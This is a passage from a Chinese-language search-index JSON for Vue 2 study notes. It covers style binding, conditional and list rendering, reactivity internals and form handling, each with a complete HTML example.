solid black; } .zhf1 { background-color: yellowgreen; } .zhf2 { font-size: 30px; text-shadow: 2px 2px 10px red; } .zhf3 { border-radius: 20px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --> <div class=\\\"basic\\\" :class=\\\"classObj\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', classObj: { zhf1: true, zhf2: false, zhf3: true, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式03.png\"]},{\"header\":\"绑定 style 样式\",\"slug\":\"绑定-style-样式\",\"contents\":[\":style=\\\"xxx\\\" \",\"样式对象中的 key，必须是存在的 CSS 属性，如 fontSize、backgroundColor（小驼峰命名法）\"]},{\"header\":\"对象写法\",\"slug\":\"对象写法-1\",\"contents\":[\":style=\\\"对象\\\"\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定style样式-对象写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定style样式--对象写法 --> <div class=\\\"basic\\\" :style=\\\"styleObj, styleObj2\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', styleObj: { fontSize: '40px', color: 'red', }, styleObj2: { backgroundColor: 'orange', }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式04.png\"]},{\"header\":\"数组写法\",\"slug\":\"数组写法-1\",\"contents\":[\":style=\\\"数组\\\"\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定style样式-数组写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定style样式--数组写法 --> <div class=\\\"basic\\\" :style=\\\"styleArr\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', styleArr: [ { fontSize: '40px', color: 'blue', }, { backgroundColor: 'gray', }, ], }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式05.png\"]}]},\"/frontend/vuenotes/08-Vue%E6%A0%B8%E5%BF%83-%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93.html\":{\"title\":\"Vue核心-条件渲染\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/08-Vue核心-条件渲染\"]},{\"header\":\"条件渲染\",\"slug\":\"条件渲染\",\"contents\":[\"v-if\",\"写法跟 if else 语法类似 \",\"v-if=\\\"表达式\\\"\",\"v-else-if=\\\"表达式\\\"\",\"v-else\",\"适用于：切换频率较低的场景，因为不展示的 DOM 元素直接被移除\",\"注意：v-if 可以和 v-else-ifv-else 一起使用，但要求结构不能被打断\",\"v-show\",\"写法：v-show=\\\"表达式\\\"\",\"适用于：切换频率较高的场景\",\"特点：不展示的 DOM 元素未被移除，仅仅是使用样式隐藏掉 display:none;\",\"备注：\",\"使用 v-if 的时，元素可能无法获取到，而使用 v-show 一定可以获取到\",\"template 标签不影响结构，页面 html 中不会有此标签，但只能配合 v-if，不能配合 v-show\",\"例：\",\"v-if\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>条件渲染v-if</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前的n值是：{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> <!-- 使用v-if做条件渲染 --> <h2 v-if=\\\"false\\\">欢迎来到{{name}}</h2> <h2 v-if=\\\"1 === 1\\\">欢迎来到{{name}}</h2> <!-- v-else和v-else-if --> <div v-if=\\\"n === 1\\\">A</div> <div v-else-if=\\\"n === 2\\\">B</div> <div v-else-if=\\\"n === 3\\\">C</div> <div v-else>哈哈哈</div> <!-- v-if与template的配合使用 --> <template v-if=\\\"n === 1\\\"> <h3>你好</h3> <h3>QFNU</h3> <h3>曲阜</h3> </template> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'QFNU', n: 0, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-条件渲染01.gif\",\"v-show\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>条件渲染v-show</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前的n值是:{{ n }}</h2> <button @click=\\\"n++\\\">点我n+1</button> <!-- 使用v-show做条件渲染 --> <h2 v-show=\\\"false\\\">欢迎来到{{name}}</h2> <h2 v-show=\\\"n===1\\\">欢迎来到{{name}}</h2> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'QFNU', n: 0, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-条件渲染02.gif\"]}]},\"/frontend/vuenotes/09-Vue%E6%A0%B8%E5%BF%83-%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%9B%91%E8%A7%86.html\":{\"title\":\"Vue核心-列表渲染与数据监视\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/09-Vue核心-列表渲染与数据监视\"]},{\"header\":\"列表渲染\",\"slug\":\"列表渲染\",\"contents\":[]},{\"header\":\"基本列表\",\"slug\":\"基本列表\",\"contents\":[\"v-for 指令\",\"用于展示列表数据\",\"语法：<li v-for=\\\"(item, index) of items\\\" :key=\\\"index\\\">，这里 key 可以是 index，更好的是遍历对象的唯一标识，这里的 of 也可以用 in\",\"可遍历：数组、对象、字符串（用的少）、指定次数（用的少）\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>基本列表</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <!-- 遍历数组 --> <h3>人员列表（遍历数组）</h3> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"index\\\">{{p.name}}-{{p.age}}</li> </ul> <!-- 遍历对象 --> <h3>汽车信息（遍历对象）</h3> <ul> <li v-for=\\\"(value,k) of car\\\" :key=\\\"k\\\">{{k}}-{{value}}</li> </ul> <!-- 遍历字符串 --> <h3>演示遍历字符串（用得少）</h3> <ul> <li v-for=\\\"(char,index) of str\\\" :key=\\\"index\\\">{{char}}-{{index}}</li> </ul> <!-- 遍历指定次数 --> <h3>演示遍历指定次数（用得少）</h3> <ul> <li v-for=\\\"(number,index) of 5\\\" :key=\\\"index\\\"> {{ index }}-{{ number }} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { persons: [ { id: '001', name: '张三', age: 18 }, { id: '002', name: '李四', age: 19 }, { id: '003', name: '王五', age: 20 }, ], car: { name: '奥迪', price: '70万', color: '黑色', }, str: 'hello', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视01.png\"]},{\"header\":\"key 的作用与原理\",\"slug\":\"key-的作用与原理\",\"contents\":[\"原理：\",\"Vue核心-列表渲染与数据监视02.jpg\",\"Vue核心-列表渲染与数据监视03.jpg\",\"面试题：react、vue 中的 key 有什么作用？（key 的内部原理）\",\"虚拟 DOM 中 key 的作用：key 是虚拟 DOM 中对象的标识，当数据发生变化时，Vue 会根据新数据生成新的虚拟 DOM，随后 Vue 进行新虚拟 DOM 与旧虚拟 DOM 的差异比较，比较规则如下： \",\"旧虚拟 DOM 中找到了与新虚拟 DOM 相同的 key \",\"若虚拟 DOM 中内容没变, 直接使用之前的真实 DOM\",\"若虚拟 DOM 中内容变了, 则生成新的真实 DOM，随后替换掉页面中之前的真实 DOM\",\"旧虚拟 DOM 中未找到与新虚拟 DOM 相同的 key \",\"创建新的真实 DOM，随后渲染到到页面\",\"用 index 作为 key 可能会引发的问题 \",\"若对数据进行逆序添加、逆序删除等破坏顺序操作，会产生没有必要的真实 DOM 更新 ==> 界面效果没问题，但效率低\",\"若结构中还包含输入类的 DOM：会产生错误 DOM 更新 ==> 界面有问题\",\"开发中如何选择 key？ \",\"最好使用每条数据的唯一标识作为 key，比如 id、手机号、身份证号、学号等唯一值\",\"如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用 index 作为 key 是没有问题的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>key的原理</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表（遍历数组）</h2> <button @click.once=\\\"add\\\">添加一个老刘</button> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"index\\\"> {{p.name}}-{{p.age}} <input type=\\\"text\\\" /> </li> </ul> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false new Vue({ el: '#root', data: { persons: [ { id: '001', name: '张三', age: 18 }, { id: '002', name: '李四', age: 19 }, { id: '003', name: '王五', age: 20 }, ], }, methods: { add() { const p = { id: '004', name: '老刘', age: 40 } this.persons.unshift(p) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视04.gif\"]},{\"header\":\"列表过滤\",\"slug\":\"列表过滤\",\"contents\":[\"可以使用 watch 也可以使用计算属性，使用计算属性更加简单方便一点\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>列表过滤</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <input type=\\\"text\\\" placeholder=\\\"请输入名字\\\" v-model=\\\"keyWord\\\" /> <ul> <li v-for=\\\"(p,index) of filPersons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { keyWord: '', persons: [ { id: '001', name: '马冬梅', age: 19, sex: '女' }, { id: '002', name: '周冬雨', age: 20, sex: '女' }, { id: '003', name: '周杰伦', age: 21, sex: '男' }, { id: '004', name: '温兆伦', age: 22, sex: '男' }, ], //用watch实现 //filPersons: [], }, //用watch实现 /*watch: { keyWord: { immediate: true, handler(val) { this.filPersons = this.persons.filter((p) => { return p.name.indexOf(val) !== -1 }) }, }, },*/ //用computed实现 computed: { filPersons() { return this.persons.filter((p) => { return p.name.indexOf(this.keyWord) !== -1 }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视05.gif\"]},{\"header\":\"列表排序\",\"slug\":\"列表排序\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>列表排序</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <input type=\\\"text\\\" placeholder=\\\"请输入名字\\\" v-model=\\\"keyWord\\\" /> <button @click=\\\"sortType = 2\\\">年龄升序</button> <button @click=\\\"sortType = 1\\\">年龄降序</button> <button @click=\\\"sortType = 0\\\">原顺序</button> <ul> <li v-for=\\\"(p,index) of filPersons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { keyWord: '', sortType: 0, //0原顺序，1降序，2升序 persons: [ { id: '001', name: '马冬梅', age: 30, sex: '女' }, { id: '002', name: '周冬雨', age: 31, sex: '女' }, { id: '003', name: '周杰伦', age: 18, sex: '男' }, { id: '004', name: '温兆伦', age: 19, sex: '男' }, ], }, computed: { filPersons() { const arr = this.persons.filter((p) => { return p.name.indexOf(this.keyWord) !== -1 }) //判断是否需要排序 if (this.sortType) { arr.sort((p1, p2) => { return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age }) } return arr }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视06.gif\"]},{\"header\":\"Vue 数据监视\",\"slug\":\"vue-数据监视\",\"contents\":[\"更新时的一个问题：this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} 更改 data 数据，Vue 不监听，模板不改变\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>更新时的一个问题</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <button @click=\\\"updateMei\\\">更新马冬梅的信息</button> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { persons: [ { id: '001', name: '马冬梅', age: 30, sex: '女' }, { id: '002', name: '周冬雨', age: 31, sex: '女' }, { id: '003', name: '周杰伦', age: 18, sex: '男' }, { id: '004', name: '温兆伦', age: 19, sex: '男' }, ], }, methods: { updateMei() { // this.persons[0].name = '马老师' //奏效 // this.persons[0].age = 50 //奏效 // this.persons[0].sex = '男' //奏效 // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效 this.persons.splice(0, 1, { id: '001', name: '马老师', age: 50, sex: '男', }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视07.gif\",\"我们先来研究一下 Vue 是如何监测对象里面属性的改变的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue监测数据改变的原理-对象</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <h2>学校名称：{{name }}</h2> <h2>学校地址：{{address}}</h2> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) </script> </body> </html> \",\"我们打开控制台，由于数据代理，data 中的数据最终会出现在 vm 身上\",\"Vue核心-列表渲染与数据监视08.png\",\"我们复习一下数据代理：\",\"Vue核心-MVVM模型与数据代理06.png\",\"Vue 将 data 中的数据拷贝了一份到 _data 属性中，其实在这一步之前还有一步，那就是对 data 中的数据进行加工\",\"若没有加工的过程，那么 _data 和 data 中的内容应该就是一模一样的, 而 _data 中内容如下图：\",\"Vue核心-列表渲染与数据监视09.png\",\"所谓加工简单来说就是把 data 中的每一组 key-value 都生成一个 getter 和 setter，那么为什么要加工 data 呢，因为这样可以做响应式：例如当我们修改了 data 中的 name 属性，name 的 setter 就会被调用，在 setter 中调用了一个方法，会重新解析模板，生成新的虚拟 DOM，然后 diff 算法对比，然后更新页面，从而实现对数据的监视\",\"我们来模拟一个数据监视（Vue 中实现的更加完善）\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>模拟数据监视</title> </head> <body> <script> let data = { name: '曲阜师范大学', address: '曲阜', } //创建一个监视的实例对象，用于监视data中属性的变化 const obs = new Observer(data) console.log(obs) // 准备一个vm实例对象 let vm = {} vm._data = data = obs function Observer(obj) { // 汇总对象中所有的属性形成一个数组 const keys = Object.keys(obj) console.log(keys) // 遍历 keys.forEach((k) => { Object.defineProperty(this, k, { get() { return obj[k] }, set(val) { console.log( `${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了` ) obj[k] = val }, }) }) } </script> </body> </html> \",\"Observer 构造函数会将 data 中的每个属性都添加到 Observer 实例对象中（通过 defineProperty()），并生成相应的 getter 和 setter，实现对 data 中属性的代理（data 是创建实例时传入的参数）\",\"效果：\",\"Vue核心-列表渲染与数据监视10.png\",\"存在两个问题：\",\"在 Vue 中还对 _data（data） 中的属性进行了代理，可以直接通过 vm.xxx 操作数据，而这里需要通过 vm._data.xxx 来操作数据\",\"只能监测一层数据，如果 data 中有对象，对象中还有属性，就监测不到\",\"下面我们认识一个 API：Vue.set()\",\"首先我们应该知道：读取一个对象中不存在的属性，是 undefined，不报错，如果一个属性值是 undefined，Vue 不会把他展示到页面上\",\"假设需要给某个对象添加一个新的属性（该属性一开始没有定下来，没有在源代码中写，后来随着用户的交互发现需要添加这么一个性别属性），如果直接在 vm._data.某对象 或者 vm 中添加该属性，是做不到响应式的，没有 getter 和 setter 方法，而通过 Vue.set() 或者 vm.$set() 方法，可以做到“后添加的数据也可以实现响应式“\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue.set的使用</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> <hr /> <h1>学生信息</h1> <button @click=\\\"addSex\\\">添加一个性别，默认值男</button> <h2>学生姓名：{{student.name}}</h2> <h2 v-if=\\\"student.sex\\\">学生性别：{{student.sex}}</h2> <h2>学生年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2> <h2>朋友们</h2> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{f.name}}--{{f.age}} </li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', student: { name: 'tom', age: { rAge: 21, sAge: 18, }, friends: [ { name: 'jerry', age: 23 }, { name: 'tony', age: 24 }, ], }, }, methods: { addSex() { //Vue.set(this.student, 'sex', '男') this.$set(this.student, 'sex', '男') }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视11.gif\",\"接下来我们研究一下 Vue 是如何监测数组里面属性的改变的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue监测数据改变的原理-数组</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> <hr /> <h1>学生信息</h1> <button @click=\\\"addSex\\\">添加一个性别，默认值男</button> <h2>学生姓名：{{student.name}}</h2> <h2 v-if=\\\"student.sex\\\">学生性别：{{student.sex}}</h2> <h2>学生年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2> <h2>朋友们</h2> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{f.name}}--{{f.age}} </li> </ul> <h2>爱好</h2> <ul> <li v-for=\\\"(h,index) in student.hobby\\\" :key=\\\"index\\\">{{h}}</li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', student: { name: 'tom', age: { rAge: 21, sAge: 18, }, hobby: ['唱', '跳', 'rap'], friends: [ { name: 'jerry', age: 23 }, { name: 'tony', age: 24 }, ], }, }, methods: { addSex() { //Vue.set(this.student, 'sex', '男') this.$set(this.student, 'sex', '男') }, }, }) </script> </body> </html> \",\"我们在控制台中会发现：\",\"Vue 核心-列表渲染与数据监视12.png\",\"数组中的数据并没有 getter 和 setter 方法，这也就解释了上面的更新数组的问题\",\"总结\",\"vue 会监视 data 中所有层次的数据\",\"如何监测对象中的数据？通过 setter 实现监视，且要在 new Vue() 时就传入要监测的数据 \",\"对象创建后追加的属性，Vue 默认不做响应式处理\",\"如需给后添加的属性做响应式，请使用如下 API Vue.set(target,propertyName/index,value) 或 vm.$set(target,propertyName/index,value)\",\"如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质就是做了两件事 \",\"调用原生对应的方法对数组进行更新\",\"重新解析模板，进而更新页面\",\"在 Vue 修改数组中的某个元素一定要用如下方法 \",\"push() 、pop() 、unshift()、shift()、splice()、sort()、reverse() ，这几个方法被 Vue 重写了\",\"Vue.set() 或 vm.$set()，特别注意：Vue.set() 和 vm.$set() 不能给 vm 或 vm 的根数据对象（data 等）添加属性\",\"综合案例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>总结数据监视</title> <style> button { margin-top: 10px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h1>学生信息</h1> <button @click=\\\"student.age++\\\">年龄+1岁</button> <br /> <button @click=\\\"addSex\\\">添加性别属性，默认值：男</button> <br /> <button @click=\\\"student.sex = '未知' \\\">修改性别</button> <br /> <button @click=\\\"addFriend\\\">在列表首位添加一个朋友</button> <br /> <button @click=\\\"updateFirstFriendName\\\"> 修改第一个朋友的名字为：张三 </button> <br /> <button @click=\\\"addHobby\\\">添加一个爱好</button> <br /> <button @click=\\\"updateHobby\\\">修改第一个爱好为：开车</button> <br /> <button @click=\\\"removeSmoke\\\">过滤掉爱好中的rap</button> <br /> <h3>姓名：{{ student.name }}</h3> <h3>年龄：{{ student.age }}</h3> <h3 v-if=\\\"student.sex\\\">性别：{{student.sex}}</h3> <h3>爱好：</h3> <ul> <li v-for=\\\"(h,index) in student.hobby\\\" :key=\\\"index\\\">{{ h }}</li> </ul> <h3>朋友们：</h3> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{ f.name }}--{{ f.age }} </li> </ul> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { student: { name: 'tom', age: 18, hobby: ['唱', '跳', 'rap'], friends: [ { name: 'jerry', age: 35 }, { name: 'tony', age: 36 }, ], }, }, methods: { addSex() { // Vue.set(this.student,'sex','男') this.$set(this.student, 'sex', '男') }, addFriend() { this.student.friends.unshift({ name: 'jack', age: 70 }) }, updateFirstFriendName() { this.student.friends[0].name = '张三' }, addHobby() { this.student.hobby.push('学习') }, updateHobby() { // this.student.hobby.splice(0,1,'开车') // Vue.set(this.student.hobby,0,'开车') this.$set(this.student.hobby, 0, '开车') }, removeSmoke() { this.student.hobby = this.student.hobby.filter((h) => { return h !== 'rap' }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue 核心-列表渲染与数据监视13.gif\"]}]},\"/frontend/vuenotes/10-Vue%E6%A0%B8%E5%BF%83-%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE.html\":{\"title\":\"Vue核心-收集表单数据\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/10-Vue核心-收集表单数据\"]},{\"header\":\"收集表单数据\",\"slug\":\"收集表单数据\",\"contents\":[\"收集表单数据\",\"若 <input type=\\\"text\\\"/>，则 v-model 收集的是 value 值，用户输入的内容就是 value 值\",\"若 <input type=\\\"radio\\\"/>，则 v-model 收集的是 value 值，且要给标签配置 value 属性\",\"若 <input type=\\\"checkbox\\\"/>\",\"没有配置 value 属性，那么收集的是 checked 属性（勾选 or 未勾选，是布尔值）\",\"配置了 value 属性 \",\"v-model 的初始值是非数组，那么收集的就是 checked（勾选 or 未勾选，是布尔值）\",\"v-model 的初始值是数组，那么收集的就是 value 组成的数组\",\"v-model 的三个修饰符：\",\"lazy 失去焦点后再收集数据\",\"number 输入字符串转为有效的数字\",\"trim 输入首尾空格过滤\",\"form 表单中 @submit.prevent 作用方法\",\"<form @submit.prevent=\\\"Demo\\\"></form> \",\"submit：表示通常与 form 联合使用，在表单中有提交或按钮，立马触发后面紧跟的方法\",\".prevent：表示阻止默认事件的修饰符，提交以后不会刷新页面。阻止默认事件就是指有些标签本身会存在事件，如 a 标签的跳转，form 表单中的 submit 按钮的提交事件等，某些时候想执行自己设置的事件，这个时候就需要阻止标签的默认事件的执行。在 Vue 中，只需要使用 .prevent 修饰符就可以\",\"注：.prevent 不一定非要跟 submit 绑定在一起\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>收集表单数据</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <form @submit.prevent=\\\"test\\\"> 账号：<input type=\\\"text\\\" v-model.trim=\\\"userInfo.account\\\" /><br /> 密码：<input type=\\\"password\\\" v-model=\\\"userInfo.passWord\\\" /><br /> 年龄：<input type=\\\"number\\\" v-model.number=\\\"userInfo.age\\\" /><br /> 性别：<br /> 男<input type=\\\"radio\\\" v-model=\\\"userInfo.sex\\\" value=\\\"male\\\" /> 女<input type=\\\"radio\\\" v-model=\\\"userInfo.sex\\\" value=\\\"female\\\" /><br /> 爱好：<br /> 学习<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"study\\\" /> 打游戏<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"game\\\" /> 吃饭<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"eat\\\" /> <br /> 所属校区: <br /> <select v-model=\\\"userInfo.area\\\"> <option value=\\\"\\\">请选择校区</option> <option value=\\\"QuFuL\\\">曲阜老校区</option> <option value=\\\"QuFuX\\\">曲阜新校区</option> <option value=\\\"RiZhao\\\">日照校区</option> </select> <br /> 其他信息：<br /> <textarea v-model.lazy=\\\"userInfo.other\\\"></textarea> <br /> <input type=\\\"checkbox\\\" v-model=\\\"userInfo.agree\\\" />阅读并接受 <a href=\\\"https://www.qfnu.edu.cn\\\">《用户协议》</a> <br /> <button>提交</button> </form> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { userInfo: { account: '', passWord: '', age: 18, sex: 'female', hobby: [], area: '', other: '', agree: '', }, }, methods: { test() { console.log(JSON.stringify(this.userInfo)) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-收集表单数据01.png\"]}]},\"/frontend/vuenotes/11-Vue%E6%A0%B8%E5%BF%83-%E8%BF%87%E6%BB%A4%E5%99%A8.html\":{\"title\":\"Vue核心-过滤器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/11-Vue核心-过滤器\"]},{\"header\":\"过滤器 (Vue 3 